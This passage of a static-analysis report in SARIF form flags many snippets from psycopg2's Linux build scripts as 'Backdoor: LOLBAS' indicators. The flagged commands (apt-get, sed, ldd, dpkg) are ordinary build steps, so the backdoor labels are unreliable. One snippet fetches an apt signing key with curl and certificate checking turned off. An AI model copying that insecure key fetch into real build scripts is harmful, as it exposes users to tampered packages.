                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 15,
                  "endLine": 34,
                  "snippet": {
                    "text": "                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n",
                    "rendered": {
                      "text": "                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n",
                      "markdown": "`                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 3,
                  "endLine": 50,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\n# Replace the package name\nif [[ \"${PACKAGE_NAME:-}\" ]]; then\n    sed -i \"s/^setup(name=\\\"psycopg2\\\"/setup(name=\\\"${PACKAGE_NAME}\\\"/\" \\\n        \"${prjdir}/setup.py\"\nfi\n\n",
                    "rendered": {
                      "text": "\n# Replace the package name\nif [[ \"${PACKAGE_NAME:-}\" ]]; then\n    sed -i \"s/^setup(name=\\\"psycopg2\\\"/setup(name=\\\"${PACKAGE_NAME}\\\"/\" \\\n        \"${prjdir}/setup.py\"\nfi\n\n",
                      "markdown": "`\n# Replace the package name\nif [[ \"${PACKAGE_NAME:-}\" ]]; then\n    sed -i \"s/^setup(name=\\\"psycopg2\\\"/setup(name=\\\"${PACKAGE_NAME}\\\"/\" \\\n        \"${prjdir}/setup.py\"\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 7,
                  "endLine": 35,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n    centos)\n",
                    "rendered": {
                      "text": "\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n    centos)\n",
                      "markdown": "`\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n    centos)\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 7,
                  "endLine": 34,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n",
                    "rendered": {
                      "text": "        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n",
                      "markdown": "`        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 7,
                  "endLine": 33,
                  "endColumn": 16,
                  "snippet": {
                    "text": "                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n",
                    "rendered": {
                      "text": "                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n",
                      "markdown": "`                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n        apt-get update\n        apt-get -y upgrade\n        apt-get -y install libpq-dev\n        ;;\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 11,
                  "endLine": 29,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            # TODO: On 2021-11-09 curl fails on 'ppc64le' with:\n            #   curl: (60) SSL certificate problem: certificate has expired\n            # Test again later if -k can be removed.\n            curl -skf https://www.postgresql.org/media/keys/ACCC4CF8.asc \\\n                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n",
                    "rendered": {
                      "text": "            # TODO: On 2021-11-09 curl fails on 'ppc64le' with:\n            #   curl: (60) SSL certificate problem: certificate has expired\n            # Test again later if -k can be removed.\n            curl -skf https://www.postgresql.org/media/keys/ACCC4CF8.asc \\\n                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n",
                      "markdown": "`            # TODO: On 2021-11-09 curl fails on 'ppc64le' with:\n            #   curl: (60) SSL certificate problem: certificate has expired\n            # Test again later if -k can be removed.\n            curl -skf https://www.postgresql.org/media/keys/ACCC4CF8.asc \\\n                > /etc/apt/trusted.gpg.d/postgresql.asc\n        fi\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 33,
                  "endLine": 26,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        if [ \"$AUDITWHEEL_ARCH\" != 'aarch64' ]; then\n            echo \"deb http://apt.postgresql.org/pub/repos/apt $VERSION_CODENAME-pgdg main\" \\\n                > /etc/apt/sources.list.d/pgdg.list\n            # TODO: On 2021-11-09 curl fails on 'ppc64le' with:\n            #   curl: (60) SSL certificate problem: certificate has expired\n            # Test again later if -k can be removed.\n            curl -skf https://www.postgresql.org/media/keys/ACCC4CF8.asc \\\n",
                    "rendered": {
                      "text": "        if [ \"$AUDITWHEEL_ARCH\" != 'aarch64' ]; then\n            echo \"deb http://apt.postgresql.org/pub/repos/apt $VERSION_CODENAME-pgdg main\" \\\n                > /etc/apt/sources.list.d/pgdg.list\n            # TODO: On 2021-11-09 curl fails on 'ppc64le' with:\n            #   curl: (60) SSL certificate problem: certificate has expired\n            # Test again later if -k can be removed.\n            curl -skf https://www.postgresql.org/media/keys/ACCC4CF8.asc \\\n",
                      "markdown": "`        if [ \"$AUDITWHEEL_ARCH\" != 'aarch64' ]; then\n            echo \"deb http://apt.postgresql.org/pub/repos/apt $VERSION_CODENAME-pgdg main\" \\\n                > /etc/apt/sources.list.d/pgdg.list\n            # TODO: On 2021-11-09 curl fails on 'ppc64le' with:\n            #   curl: (60) SSL certificate problem: certificate has expired\n            # Test again later if -k can be removed.\n            curl -skf https://www.postgresql.org/media/keys/ACCC4CF8.asc \\\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/wheel_linux_before_all.sh"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 6,
                  "endLine": 4,
                  "endColumn": 14,
                  "snippet": {
                    "text": "#!/bin/bash\n\n# Configure the libraries needed to build wheel packages on linux.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_LINUX\n\nset -euo pipefail\nset -x\n",
                    "rendered": {
                      "text": "#!/bin/bash\n\n# Configure the libraries needed to build wheel packages on linux.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_LINUX\n\nset -euo pipefail\nset -x\n",
                      "markdown": "`#!/bin/bash\n\n# Configure the libraries needed to build wheel packages on linux.\n# This script is designed to be used by cibuildwheel as CIBW_BEFORE_ALL_LINUX\n\nset -euo pipefail\nset -x\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 22,
                  "endLine": 27,
                  "snippet": {
                    "text": "        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n    centos)\n        echo \"TODO!\"\n",
                    "rendered": {
                      "text": "        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n    centos)\n        echo \"TODO!\"\n",
                      "markdown": "`        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n    centos)\n        echo \"TODO!\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 15,
                  "endLine": 26,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n    centos)\n",
                    "rendered": {
                      "text": "        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n    centos)\n",
                      "markdown": "`        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n    centos)\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 47,
                  "endLine": 25,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n",
                    "rendered": {
                      "text": "        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n",
                      "markdown": "`        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 34,
                  "endLine": 25,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n",
                    "rendered": {
                      "text": "        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n",
                      "markdown": "`        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 11,
                  "endLine": 25,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n",
                    "rendered": {
                      "text": "        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n",
                      "markdown": "`        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 44,
                  "endLine": 24,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n",
                    "rendered": {
                      "text": "    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n",
                      "markdown": "`    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n        done) | sort | uniq\n        ;;\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 46,
                  "endLine": 22,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n",
                    "rendered": {
                      "text": "        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n",
                      "markdown": "`        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 34,
                  "endLine": 22,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n",
                    "rendered": {
                      "text": "        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n",
                      "markdown": "`        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n            pkgname=$(dpkg -S \"${depfile}\" | sed 's/\\(\\): .*/\\1/')\n            dpkg -l \"${pkgname}\" | grep '^ii' | awk '{print $2 \" => \" $3}'\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 22,
                  "endLine": 19,
                  "snippet": {
                    "text": "        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n",
                    "rendered": {
                      "text": "        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n",
                      "markdown": "`        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n    debian)\n        depfiles=$(ldd \"$sofile\" | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 15,
                  "endLine": 18,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n    debian)\n",
                    "rendered": {
                      "text": "        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n    debian)\n",
                      "markdown": "`        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n    debian)\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 81,
                  "endLine": 17,
                  "endColumn": 86,
                  "snippet": {
                    "text": "    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n",
                    "rendered": {
                      "text": "    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n",
                      "markdown": "`    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 69,
                  "endLine": 15,
                  "endColumn": 74,
                  "snippet": {
                    "text": "\ncase \"$ID\" in\n    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n",
                    "rendered": {
